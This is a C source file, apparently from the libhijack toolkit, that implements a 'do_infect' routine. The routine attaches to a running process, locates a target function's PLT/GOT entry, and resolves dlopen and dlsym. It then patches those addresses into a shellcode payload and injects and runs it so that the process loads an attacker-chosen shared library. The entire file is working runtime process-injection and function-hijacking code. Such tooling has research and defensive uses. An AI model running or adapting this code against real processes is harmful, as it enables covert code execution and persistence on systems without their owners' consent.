/*
 * Copyright (c) 2018, Shawn Webb
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 *    * Redistributions of source code must retain the above copyright
 *      notice, this list of conditions and the following disclaimer.
 *    * Redistributions in binary form must reproduce the above
 *      copyright notice, this list of conditions and the following
 *      disclaimer in the documentation and/or other materials
 *      provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
 * FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
 * INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED
 * OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/param.h>

#include <hijack.h>

#include "infect.h"

void
do_infect(pid_t pid, char *inject, char *so, char *targetfunc)
{
	unsigned long addr, mapping, pltgot_addr;
	unsigned long dlopen_addr, dlsym_addr;
	FUNC *func, *funcs;
	struct stat sb;
	void *map, *p1;
	RTLD_SYM *sym;
	HIJACK *ctx;
	int fd;

	ctx = InitHijack(F_DEFAULT /* | F_DEBUG | F_DEBUG_VERBOSE*/);
	if (ctx == NULL) {
		fprintf(stderr, "[-] Could not create the libhijack ctx\n");
		return;
	}

	fd = open(inject, O_RDONLY);
	if (fd < 0) {
		perror("open");
		return;
	}

	memset(&sb, 0, sizeof(sb));
	if (fstat(fd, &sb)) {
		perror("fstat");
		return;
	}

	map = mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE,
	    MAP_PRIVATE, fd, 0);

	if (map == MAP_FAILED && errno) {
		perror("mmap");
		close(fd);
		return;
	}

	AssignPid(ctx, pid);

	if (Attach(ctx)) {
		fprintf(stderr, "[-] Could not attach to the process\n");
		munmap(map, sb.st_size);
		close(fd);
		return;
	}

	LocateAllFunctions(ctx);
	LocateSystemCall(ctx);

	pltgot_addr = 0;
	funcs = FindAllFunctionsByName(ctx, targetfunc, true);
	for (func = funcs; func != NULL; func = func->next) {
		if (!(func->name))
			continue;

		pltgot_addr = FindFunctionInGot(ctx, ctx->pltgot,
		    func->vaddr);
		if (pltgot_addr > 0)
			break;
	}

	if (pltgot_addr == 0) {
		fprintf(stderr, "[-] Could not find %s in the PLT/GOT\n",
		    targetfunc);
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		return;
	}

	sym = resolv_rtld_sym(ctx, "dlopen");
	if (sym == NULL) {
		fprintf(stderr, "[-] Could not resolve dlopen\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		return;
	}

	dlopen_addr = sym->p.ulp;

	sym = resolv_rtld_sym(ctx, "dlsym");
	if (sym == NULL) {
		fprintf(stderr, "[-] Could not resolve dlsym\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		return;
	}

	dlsym_addr = sym->p.ulp;

	mapping = MapMemory(ctx, (unsigned long)NULL, 4096,
	    PROT_READ | PROT_EXEC,
	    MAP_ANONYMOUS | MAP_SHARED);
	if (mapping == (unsigned long)NULL) {
		fprintf(stderr, "[-] Could not create anonymous mapping\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		return;
	}

	fprintf(stderr, "[+] Mapping at 0x%016lx\n", mapping);
	fprintf(stderr, "[+] %s at 0x%016lx (0x%016lx)\n",
	    targetfunc, func->vaddr, pltgot_addr);

	WriteData(ctx, mapping, (unsigned char *)so, strlen(so));
	p1 = memmem(map, sb.st_size, "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
	if (p1 == NULL) {
		fprintf(stderr, "[-] Could not find placemarker for so in payload\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		return;
	}

	memmove(p1, &mapping, 8);
	addr = mapping + strlen(so) + 1;
	WriteData(ctx, addr, (unsigned char *)targetfunc,
	    strlen(targetfunc));

	p1 = memmem(map, sb.st_size, "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
	if (p1 == NULL) {
		fprintf(stderr, "[-] Could not find placemarker for dlopen in payload\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		return;
	}

	memmove(p1, &dlopen_addr, 8);

	p1 = memmem(map, sb.st_size, "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
	if (p1 == NULL) {
		fprintf(stderr, "[-] Could not find placemarker for func in payload\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		return;
	}

	memmove(p1, &addr, 8);
	addr += strlen(targetfunc) + 1;

	p1 = memmem(map, sb.st_size, "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
	if (p1 == NULL) {
		fprintf(stderr, "[-] Could not find placemarker for dlsym in payload\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		return;
	}
	memmove(p1, &dlsym_addr, 8);

	p1 = memmem(map, sb.st_size, "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
	if (p1 == NULL) {
		fprintf(stderr, "[-] Could not find placemarker for pltgot in payload\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		return;
	}
	memmove(p1, &pltgot_addr, 8);
	fprintf(stderr, "[+] shellcode injected at 0x%016lx\n", addr);
	fprintf(stderr, "[+] dlopen is at 0x%016lx\n", dlopen_addr);
	fprintf(stderr, "[+] dlsym is at 0x%016lx\n", dlsym_addr);

	InjectShellcodeFromMemoryAndRun(ctx, addr, map,
	    sb.st_size, true);

	munmap(map, sb.st_size);
	close(fd);
	Detach(ctx);
}
